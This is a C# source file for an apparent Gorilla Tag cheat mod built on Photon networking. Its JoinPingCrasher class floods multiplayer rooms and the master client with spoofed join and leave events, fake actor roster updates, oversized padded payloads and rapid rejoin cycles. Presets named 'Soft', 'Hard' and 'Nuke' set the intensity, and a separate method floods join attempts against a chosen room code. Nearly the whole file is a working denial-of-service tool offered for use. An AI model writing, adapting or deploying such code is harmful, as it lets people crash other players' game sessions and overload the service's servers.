using ExitGames.Client.Photon;
using GorillaNetworking;
using Photon.Pun;
using Photon.Realtime;
using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using Random = UnityEngine.Random;

namespace Vaga.Mods
{
    /// <summary>
    /// JoinPingCrasher — stresses the Photon room / master by flooding
    /// join-related traffic: rapid join attempts, join ping style events,
    /// actor-number spam, and room-enter payloads.
    ///
    /// "Join pings" = high-frequency join/leave signalling + RaiseEvent
    /// payloads that mimic join handshake / player-enter traffic.
    /// </summary>
    internal static class JoinPingCrasher
    {
        public static bool Enabled;

        // Intensity
        public static int PingsPerTick = 16;
        public static float TickRate = 0.04f;
        public static bool StayInRoom = true;          // if false, also fires real join spam (aggressive)
        public static bool UseJoinEventSpam = true;
        public static bool UseActorSpam = true;
        public static bool UseRoomEnterPayload = true;
        public static bool UseJoinLeaveCycle = false;  // disconnect/rejoin loop — heavy
        public static bool TargetMaster = true;

        private static float _nextTick;
        private static float _nextJoinCycle;
        private static string _lastRoom;

        // Photon internal-ish join related codes commonly seen in GT traffic
        private static readonly byte[] JoinRelatedCodes =
        {
            255, // Join
            254, // Leave
            253, // Properties
            252,
            251,
            200, 201, 202, 203
        };

        public static void Update()
        {
            if (!Enabled) return;
            if (Time.time < _nextTick) return;
            _nextTick = Time.time + TickRate;

            if (!PhotonNetwork.InRoom && !UseJoinLeaveCycle)
                return;

            if (PhotonNetwork.InRoom)
                _lastRoom = PhotonNetwork.CurrentRoom?.Name;

            for (int i = 0; i < PingsPerTick; i++)
            {
                if (UseJoinEventSpam) SpamJoinEvents();
                if (UseActorSpam) SpamActorPings();
                if (UseRoomEnterPayload) SpamRoomEnterPayload();
            }

            if (UseJoinLeaveCycle && Time.time >= _nextJoinCycle)
            {
                _nextJoinCycle = Time.time + 0.35f;
                CycleJoinLeave();
            }
        }

        /// <summary>
        /// Flood RaiseEvents that look like join / player-enter signalling.
        /// </summary>
        private static void SpamJoinEvents()
        {
            try
            {
                if (!PhotonNetwork.InRoom) return;

                byte code = JoinRelatedCodes[Random.Range(0, JoinRelatedCodes.Length)];
                object[] payload = BuildJoinPingPayload();

                RaiseEventOptions opts = new RaiseEventOptions
                {
                    Receivers = ReceiverGroup.All,
                    CachingOption = EventCaching.DoNotCache
                };

                if (TargetMaster && PhotonNetwork.MasterClient != null)
                {
                    opts.TargetActors = new[] { PhotonNetwork.MasterClient.ActorNumber };
                    opts.Receivers = ReceiverGroup.Others;
                }

                PhotonNetwork.RaiseEvent(code, payload, opts, SendOptions.SendReliable);

                // Secondary unreliable ping burst
                PhotonNetwork.RaiseEvent(code, payload, opts, SendOptions.SendUnreliable);
            }
            catch { }
        }

        /// <summary>
        /// Actor-number / player-list style pings — forces other clients
        /// and master to process fake join roster updates.
        /// </summary>
        private static void SpamActorPings()
        {
            try
            {
                if (!PhotonNetwork.InRoom) return;

                int fakeActor = Random.Range(2, 200);
                object data = new object[]
                {
                    fakeActor,
                    PhotonNetwork.LocalPlayer.ActorNumber,
                    PhotonNetwork.LocalPlayer.UserId ?? "null",
                    PhotonNetwork.LocalPlayer.NickName ?? "ping",
                    true, // isJoining
                    PhotonNetwork.ServerTimestamp
                };

                RaiseEventOptions opts = new RaiseEventOptions
                {
                    Receivers = ReceiverGroup.All
                };

                // 255 = Join event code in Photon
                PhotonNetwork.RaiseEvent(255, data, opts, SendOptions.SendReliable);
                PhotonNetwork.RaiseEvent(254, data, opts, SendOptions.SendUnreliable);
            }
            catch { }
        }

        /// <summary>
        /// Oversized "player entered room" style custom event.
        /// </summary>
        private static void SpamRoomEnterPayload()
        {
            try
            {
                if (!PhotonNetwork.InRoom) return;

                byte[] pad = new byte[256];
                for (int i = 0; i < pad.Length; i++) pad[i] = (byte)(i & 0xFF);

                ExitGames.Client.Photon.Hashtable props = new ExitGames.Client.Photon.Hashtable
                {
                    { "didJoin", true },
                    { "joinTime", PhotonNetwork.ServerTimestamp },
                    { "ping", Random.Range(1, 999) },
                    { "pad", pad }
                };

                object[] body = new object[]
                {
                    PhotonNetwork.LocalPlayer.ActorNumber,
                    props,
                    Vector3.zero,
                    Quaternion.identity
                };

                PhotonNetwork.RaiseEvent(203, body,
                    new RaiseEventOptions { Receivers = ReceiverGroup.Others },
                    SendOptions.SendReliable);
            }
            catch { }
        }

        private static object[] BuildJoinPingPayload()
        {
            return new object[]
            {
                PhotonNetwork.LocalPlayer != null ? PhotonNetwork.LocalPlayer.ActorNumber : 0,
                Random.Range(int.MinValue, int.MaxValue),
                PhotonNetwork.ServerTimestamp,
                "join_ping",
                float.NaN,
                new byte[128]
            };
        }

        /// <summary>
        /// Aggressive: leave + rejoin same / random room rapidly.
        /// Generates real join traffic on the Photon backend.
        /// </summary>
        private static void CycleJoinLeave()
        {
            try
            {
                if (PhotonNetwork.InRoom)
                {
                    _lastRoom = PhotonNetwork.CurrentRoom?.Name;
                    PhotonNetwork.LeaveRoom(false);
                }
                else
                {
                    if (!string.IsNullOrEmpty(_lastRoom))
                    {
                        var ctrl = PhotonNetworkController.Instance;
                        if (ctrl != null)
                            ctrl.AttemptToJoinSpecificRoom(_lastRoom, JoinType.Solo);
                        else
                            PhotonNetwork.JoinRoom(_lastRoom);
                    }
                    else
                    {
                        PhotonNetwork.JoinRandomRoom();
                    }
                }
            }
            catch { }
        }

        // ── Public controls ──────────────────────────────────────────────

        public static void Soft()
        {
            PingsPerTick = 6;
            TickRate = 0.08f;
            UseJoinLeaveCycle = false;
            UseRoomEnterPayload = true;
            UseActorSpam = true;
            UseJoinEventSpam = true;
        }

        public static void Hard()
        {
            PingsPerTick = 20;
            TickRate = 0.03f;
            UseJoinLeaveCycle = false;
            UseRoomEnterPayload = true;
            UseActorSpam = true;
            UseJoinEventSpam = true;
            TargetMaster = true;
        }

        public static void Nuke()
        {
            if (!PhotonNetwork.InRoom) return;
            int saved = PingsPerTick;
            PingsPerTick = 40;
            for (int t = 0; t < 25; t++)
            {
                for (int i = 0; i < PingsPerTick; i++)
                {
                    SpamJoinEvents();
                    SpamActorPings();
                    SpamRoomEnterPayload();
                }
            }
            PingsPerTick = saved;
        }

        /// <summary>
        /// Burst of real join attempts against a specific room code.
        /// </summary>
        public static void FloodJoinCode(string code, int count = 12)
        {
            if (string.IsNullOrWhiteSpace(code)) return;
            code = code.ToUpperInvariant();
            try
            {
                var ctrl = PhotonNetworkController.Instance;
                for (int i = 0; i < count; i++)
                {
                    if (ctrl != null)
                        ctrl.AttemptToJoinSpecificRoom(code, JoinType.Solo);
                    else
                        PhotonNetwork.JoinRoom(code);
                }
            }
            catch (Exception ex)
            {
                Debug.LogWarning("[JoinPingCrasher] FloodJoinCode: " + ex.Message);
            }
        }

        public static void Status()
        {
            Debug.Log($"[JoinPingCrasher] Enabled={Enabled} Pings/tick={PingsPerTick} " +
                      $"Rate={TickRate} JoinCycle={UseJoinLeaveCycle} Master={TargetMaster}");
        }
    }
}
